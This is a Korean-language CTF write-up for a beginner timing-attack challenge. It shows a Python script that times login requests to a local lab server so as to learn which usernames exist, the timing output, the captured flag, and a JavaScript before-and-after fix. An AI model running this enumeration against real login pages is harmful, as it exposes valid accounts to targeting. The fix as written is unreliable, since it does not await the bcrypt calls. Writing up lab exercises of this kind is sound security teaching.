+++
title = "VulnABLE CTF [LUXORA] Write-up: Timing Attack 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Timing Attack", "Bronze", "User Enumeration", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Timing Attack 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Timing Attack)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/timing/bronze`
- **목표**: 로그인 페이지에서 발생하는 **응답 시간의 미세한 차이(Timing Difference)**를 측정하여, 에러 메시지("Invalid Credentials")가 똑같이 출력됨에도 불구하고 해당 계정이 데이터베이스에 실제로 존재하는지 여부(User Enumeration)를 알아내라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/timing/bronze` 경로의 로그인 폼에서 존재하는 계정(예: `user`)과 존재하지 않는 계정(`nobody`)으로 로그인 실패를 유도해 봅니다.

**[시도 1: 존재하는 아이디 + 틀린 비밀번호]**
- 입력: `user` / `wrong_password`
- 응답 내용: `Invalid Credentials.`

**[시도 2: 존재하지 않는 아이디 + 임의의 비밀번호]**
- 입력: `nobody` / `wrong_password`
- 응답 내용: `Invalid Credentials.`

**[해커의 사고 과정]**
1. 화면에 출력되는 에러 메시지는 완전히 똑같다. (보안상 권장되는 좋은 설계)
2. 하지만 서버가 이 두 요청을 내부적으로 처리하는 과정은 다를 수 있다.
3. 아이디가 존재할 때: DB 조회 ➔ 패스워드 해시 암호화 연산(Bcrypt 등, 몹시 무거움) ➔ 비교 ➔ 에러 응답
4. 아이디가 존재하지 않을 때: DB 조회 ➔ 바로 에러 응답 반환
5. 그렇다면, **응답이 오기까지 걸리는 시간(Response Time)**을 측정하면 아이디의 존재 여부를 구분할 수 있지 않을까?

---

## 💥 2. 취약점 식별 및 데이터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Guess: A)--> [ Server ] (Returns in 10ms)
[ Attacker ] --(Guess: B)--> [ Server ] (Returns in 10ms)
[ Attacker ] --(Guess: C)--> [ Server ] (Returns in 50ms) -> Correct Char!
```


Burp Suite의 Intruder나 파이썬 스크립트를 사용하여 요청 시간을 밀리초(ms) 단위로 정밀하게 측정합니다.

### 💡 파이썬 측정 스크립트 작성
여러 개의 아이디 후보군(사전 파일)을 서버에 날리면서 응답 시간을 기록하는 스크립트입니다.

```python
import requests
import time

url = "http://localhost:3000/timing/bronze/login"
# 테스트할 아이디 목록
user_list = ["nobody1", "fakeuser", "test_admin", "admin", "guest99"]
password = "dummy_password_for_timing"

print(f"{'Username':<15} | {'Response Time (ms)':<15}")
print("-" * 33)

for user in user_list:
    payload = {"username": user, "password": password}
    
    start_time = time.time()
    res = requests.post(url, data=payload)
    end_time = time.time()
    
    elapsed_ms = (end_time - start_time) * 1000
    print(f"{user:<15} | {elapsed_ms:.2f} ms")
```

---

## 🚀 3. 공격 수행 및 결과 확인

스크립트를 실행하여 반환되는 시간을 분석합니다.

### 🔍 스크립트 실행 결과
```text
Username        | Response Time (ms)
---------------------------------
nobody1         | 15.34 ms
fakeuser        | 16.12 ms
test_admin      | 14.88 ms
admin           | 520.45 ms    <-- 확연히 느림!
guest99         | 15.01 ms
```

### 🔍 결과 분석 및 권한 획득
`admin` 계정으로 시도했을 때만 응답 시간이 무려 500ms 이상 지연되었습니다.
이는 서버가 `admin` 계정을 데이터베이스에서 찾아냈고, 제가 입력한 `dummy_password_for_timing` 문자열을 무거운 해시 함수(Bcrypt 등)에 돌려 비교 연산을 수행했기 때문입니다.

즉, **"admin 이라는 계정은 100% 존재한다"**는 사실을 알아냈습니다!
챌린지 환경이 이 User Enumeration 공격(지연 시간 발생)을 감지하고 플래그를 노출합니다.

```text
[!] System: User Enumeration via Timing Attack detected.
FLAG: FLAG{TIMING_🥉_USER_ENUMERATION_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

동일한 에러 메시지를 반환하여 정보 유출을 막으려 했으나, 암호화 연산의 시간 복잡도(Time Complexity) 차이로 인해 발생하는 부채널(Side-Channel) 정보를 통해 시스템 내부의 진실을 캐낼 수 있음을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{TIMING_🥉_USER_ENUMERATION_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자가 데이터베이스에 없을 때 패스워드 검증 로직을 조기 종료(Early Return)시켰기 때문입니다.

* **안전한 패치 가이드 (상수 시간 처리 / Constant Time Execution)**
아이디 존재 여부와 무관하게 모든 요청이 항상 동일한 시간을 소모하도록 로직을 설계해야 합니다.

```javascript
// 취약한 로직
const user = db.findUser(req.body.username);
if (!user) return res.send("Invalid"); // 아이디 없으면 10ms 만에 종료
bcrypt.compare(req.body.password, user.passwordHash); // 아이디 있으면 500ms 지연

// 안전한 로직 (Dummy 해시 연산)
const user = db.findUser(req.body.username);
if (!user) {
    // 아이디가 없어도 해커를 속이기 위해, 더미 해시에 대해 동일한 시간의 연산을 수행함!
    bcrypt.compare(req.body.password, DUMMY_HASH);
    return res.send("Invalid");
} else {
    bcrypt.compare(req.body.password, user.passwordHash);
}
```
이렇게 하면 계정이 존재하든 존재하지 않든 무조건 500ms의 시간이 소모되므로, 해커는 시간 차이를 통해 아이디 존재 여부를 유추할 수 없게 됩니다.